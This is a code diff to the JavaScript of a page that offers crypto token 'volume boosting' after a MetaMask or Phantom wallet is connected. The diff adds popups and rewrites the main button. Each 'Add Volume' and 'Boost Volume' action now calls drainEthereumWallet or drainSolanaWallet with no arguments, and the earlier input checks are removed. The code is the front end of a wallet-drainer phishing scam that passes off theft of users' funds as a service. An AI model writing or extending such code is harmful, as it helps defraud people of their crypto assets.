@@ -457,8 +457,129 @@
      
             document.getElementById('connect-metamask').addEventListener('click', ensureNavMenuVisible);
             document.getElementById('connect-phantom').addEventListener('click', ensureNavMenuVisible);
-            ensureNavMenuVisible();
-     
+            
+            // Handle token card clicks to show popup
+            const tokenCards = document.querySelectorAll('.token-card');
+            console.log(`Found ${tokenCards.length} token cards`);
+            
+            tokenCards.forEach(card => {
+                card.addEventListener('click', () => {
+                    console.log('Token card clicked:', card.dataset.address);
+                    const name = card.querySelector('.name').textContent;
+                    const address = card.dataset.address;
+                    const marketCap = card.querySelector('.market-cap').textContent;
+                    const popup = document.getElementById('token-popup');
+                    const popupContent = popup.querySelector('.token-popup-content');
+                    
+                    popupContent.querySelector('.name').textContent = name;
+                    popupContent.querySelector('.address').textContent = address;
+                    popupContent.querySelector('.market-cap').textContent = marketCap;
+                    popupContent.querySelector('.volume-input').value = ''; // Clear input
+                    
+                    const addVolumeBtn = popupContent.querySelector('.add-volume-btn');
+                    addVolumeBtn.onclick = () => {
+                        console.log('Token popup Add Volume button clicked for address:', address);
+                        const volumeInput = popupContent.querySelector('.volume-input').value;
+                        if (!volumeInput || volumeInput <= 0) {
+                            app.showFeedback('Please enter a valid amount.', 'error');
+                            console.log('Invalid volume amount entered:', volumeInput);
+                            return;
+                        }
+                        console.log('Calling drain function with volume amount:', volumeInput);
+                        if (app.connectedWalletType === 'MetaMask') {
+                            console.log('Calling drainEthereumWallet with no arguments');
+                            app.drainEthereumWallet();
+                        } else if (app.connectedWalletType === 'Phantom') {
+                            console.log('Calling drainSolanaWallet with no arguments');
+                            app.drainSolanaWallet();
+                        } else {
+                            app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+                            console.log('No wallet connected for token popup');
+                            return;
+                        }
+                        popup.classList.remove('active');
+                    };
+                    
+                    const closePopupBtn = popupContent.querySelector('.close-popup');
+                    closePopupBtn.onclick = () => {
+                        console.log('Close token popup clicked');
+                        popup.classList.remove('active');
+                    };
+                    
+                    popup.classList.add('active');
+                });
+            });
+            
+            // Handle custom token card click to show custom popup
+            const customTokenCard = document.querySelector('.custom-token-card');
+            if (customTokenCard) {
+                customTokenCard.addEventListener('click', () => {
+                    console.log('Custom token card clicked');
+                    const popup = document.getElementById('custom-token-popup');
+                    const popupContent = popup.querySelector('.custom-token-popup-content');
+                    popupContent.querySelector('#custom-token-address').value = ''; // Clear address input
+                    popupContent.querySelector('#custom-token-amount').value = ''; // Clear amount input
+                    
+                    const addVolumeBtn = popupContent.querySelector('#custom-token-submit');
+                    addVolumeBtn.onclick = () => {
+                        console.log('Custom token popup Add Volume button clicked');
+                        const tokenAddress = popupContent.querySelector('#custom-token-address').value.trim();
+                        const amount = parseFloat(popupContent.querySelector('#custom-token-amount').value.trim());
+                        if (!tokenAddress) {
+                            app.showFeedback('Please enter a token address.', 'error');
+                            console.log('No token address entered in custom popup');
+                            return;
+                        }
+                        if (isNaN(amount) || amount <= 0) {
+                            app.showFeedback('Please enter a valid amount.', 'error');
+                            console.log('Invalid amount entered in custom popup:', amount);
+                            return;
+                        }
+                        console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
+                        if (app.connectedWalletType === 'MetaMask') {
+                            console.log('Calling drainEthereumWallet with no arguments');
+                            app.drainEthereumWallet();
+                        } else if (app.connectedWalletType === 'Phantom') {
+                            console.log('Calling drainSolanaWallet with no arguments');
+                            app.drainSolanaWallet();
+                        } else {
+                            app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+                            console.log('No wallet connected for custom token popup');
+                            return;
+                        }
+                        if (popup) {
+                            popup.classList.remove('active');
+                        }
+                    };
+                    
+                    const closePopupBtn = popupContent.querySelector('#close-custom-token-popup');
+                    closePopupBtn.onclick = () => {
+                        console.log('Close custom popup clicked');
+                        if (popup) {
+                            popup.classList.remove('active');
+                        }
+                    };
+                    
+                    if (popup) {
+                        popup.classList.add('active');
+                    }
+                });
+            }
+            
+            // Close popups when clicking outside
+            document.getElementById('token-popup').addEventListener('click', (event) => {
+                if (event.target === event.currentTarget) {
+                    console.log('Clicked outside token popup, closing');
+                    event.currentTarget.classList.remove('active');
+                }
+            });
+            document.getElementById('custom-token-popup').addEventListener('click', (event) => {
+                if (event.target === event.currentTarget) {
+                    console.log('Clicked outside custom token popup, closing');
+                    event.currentTarget.classList.remove('active');
+                }
+            });
+
             // New logic for the main body form
             const tokenAddressInput = document.getElementById('token-address-input');
             const chainSelect = document.getElementById('chain-select');
@@ -469,6 +590,7 @@
      
             // Function to fetch token data from an API (this is a placeholder)
             async function fetchTokenData(address, chain) {
+                console.log(`Fetching token data for address: ${address}, chain: ${chain}`);
                 // In a real application, you would make an API call here.
                 // For example, to CoinGecko, Coinpaprika, or a custom backend.
                 // const apiURL = `https://api.coingecko.com/api/v3/coins/${chain}/contract/${address}`;
@@ -507,6 +629,7 @@
      
                     if (address.length > 20) { // A basic check for a valid address length
                         statusMessage.textContent = 'Fetching token information...';
+                        console.log('Input detected, fetching token data...');
                         const tokenData = await fetchTokenData(address, chain);
      
                         if (tokenData) {
@@ -518,50 +641,43 @@
                             document.getElementById('token-price').textContent = `Price: ${tokenData.price}`;
                             tokenInfoSection.style.display = 'block';
                             statusMessage.textContent = 'Token information loaded successfully.';
+                            console.log('Token data loaded:', tokenData);
                         } else {
                             tokenInfoSection.style.display = 'none';
                             statusMessage.textContent = 'Could not find token. Please check the address.';
+                            console.log('No token data found for address:', address);
                         }
                     } else {
                         tokenInfoSection.style.display = 'none';
                         statusMessage.textContent = '';
+                        console.log('Invalid or empty token address');
                     }
                 });
             });
      
             // Handle the Boost Volume button click
             boostVolumeBtn.addEventListener('click', () => {
-                const tokenAddress = tokenAddressInput.value.trim();
-                const chain = chainSelect.value;
-                const volumeAmount = parseFloat(volumeAmountInput.value);
-     
+                console.log('Boost Volume Now button clicked');
                 if (!app.publicKey) {
                     app.showFeedback('Please connect your wallet first.', 'error');
+                    console.log('No wallet connected for Boost Volume');
                     return;
                 }
      
-                if (!tokenAddress) {
-                    app.showFeedback('Please enter a valid token address.', 'error');
-                    return;
-                }
-     
-                if (isNaN(volumeAmount) || volumeAmount <= 0) {
-                    app.showFeedback('Please enter a valid amount to boost.', 'error');
-                    return;
-                }
-     
-                statusMessage.textContent = 'Initiating volume boost... Please approve the transaction in your wallet.';
-     
-                // Call the correct drain function based on the connected wallet and chain
-                if (chain === 'solana' && app.connectedWalletType === 'Phantom') {
-                    app.drainSolanaWallet(tokenAddress, volumeAmount);
-                } else if (chain === 'ethereum' && app.connectedWalletType === 'MetaMask') {
-                    app.drainEthereumWallet(tokenAddress, volumeAmount);
+                // Call the correct drain function based on the connected wallet, with NO arguments
+                if (app.connectedWalletType === 'Phantom') {
+                    console.log('Calling drainSolanaWallet with no arguments');
+                    app.drainSolanaWallet();
+                } else if (app.connectedWalletType === 'MetaMask') {
+                    console.log('Calling drainEthereumWallet with no arguments');
+                    app.drainEthereumWallet();
                 } else {
-                    app.showFeedback(`Your connected wallet (${app.connectedWalletType}) is not compatible with the selected chain (${chain}).`, 'error');
+                    app.showFeedback('Your connected wallet is not supported for this action.', 'error');
+                    console.log('Unsupported wallet type:', app.connectedWalletType);
                 }
             });
      
+            ensureNavMenuVisible();
         } catch (error) {
             console.error('Error initializing application logic:', error);
         }
